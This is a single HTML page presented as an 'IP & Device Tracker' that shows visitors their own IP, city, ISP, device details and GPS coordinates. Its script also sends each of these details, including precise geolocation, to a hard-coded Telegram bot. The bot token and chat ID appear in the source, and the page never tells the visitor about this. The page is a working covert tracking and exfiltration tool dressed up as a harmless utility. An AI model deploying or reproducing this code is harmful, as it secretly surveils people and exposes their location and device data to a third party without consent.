<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP & Device Tracker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h2>Click the button to get your details</h2>
    <button onclick="getUserDetails()">Get My Info</button>
    <p id="result"></p>

    <script>
        function getUserDetails() {
            document.getElementById("result").innerText = "Fetching details...";

            fetch("https://api64.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;
                    getIPDetails(userIP);
                })
                .catch(error => console.error("Error fetching IP:", error));
        }

        function getIPDetails(ip) {
            fetch(`https://ip-api.com/json/${ip}`)
                .then(response => response.json())
                .then(ipData => {
                    if (ipData.status === "fail") {
                        document.getElementById("result").innerText = "Error fetching IP details.";
                        return;
                    }

                    const deviceInfo = getDeviceInfo();
                    const ipDetails = `
                        🌍 IP: ${ipData.query}
                        🏳 Country: ${ipData.country}
                        🏙 City: ${ipData.city}
                        🏢 ISP: ${ipData.isp}
                        🌍 Lat: ${ipData.lat}, Lon: ${ipData.lon}
                        📱 Device: ${deviceInfo}
                    `;

                    document.getElementById("result").innerText = ipDetails;
                    sendToTelegram(ipDetails);

                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                const locationDetails = `
                                    📍 GPS Location:
                                    Latitude: ${position.coords.latitude}
                                    Longitude: ${position.coords.longitude}
                                `;
                                document.getElementById("result").innerText += "\n\n" + locationDetails;
                                sendToTelegram(locationDetails);
                            },
                            error => console.log("Geolocation error:", error)
                        );
                    }
                })
                .catch(error => console.error("Error fetching IP details:", error));
        }

        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            return `${userAgent} (Screen: ${screenWidth}x${screenHeight})`;
        }

        function sendToTelegram(message) {
            const botToken = "8168694027:AAEd-uBNjblJM74OkQnmlAZ_3Fh99SUkD8g";
            const chatId = "7182702425";

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).then(response => response.json())
              .then(data => console.log("Sent to Telegram:", data))
              .catch(error => console.error("Telegram Error:", error));
        }
    </script>
</body>
</html>
